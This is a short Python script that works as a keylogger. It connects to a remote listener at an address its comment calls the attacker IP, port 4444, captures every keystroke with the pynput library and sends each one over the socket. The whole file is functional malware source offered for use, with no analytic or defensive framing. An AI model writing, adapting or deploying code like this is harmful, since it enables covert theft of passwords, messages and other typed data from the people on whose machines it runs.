import socket
from pynput import keyboard

IP_ADDRESS = "192.168.70.3"  # Replace with your attacker/server IP
PORT = 4444  # Make sure this matches your listener/server

# Create the socket once
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    client_socket.connect((IP_ADDRESS, PORT))
except Exception as e:
    print(f"Connection failed: {e}")
    exit()

def on_press(key):
    try:
        # Try to get the character of the key
        client_socket.send(str(key.char).encode())
    except AttributeError:
        # Handle special keys (space, enter, etc.)
        client_socket.send(f"[{key}]".encode())

# Start key listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

# When finished
client_socket.close()
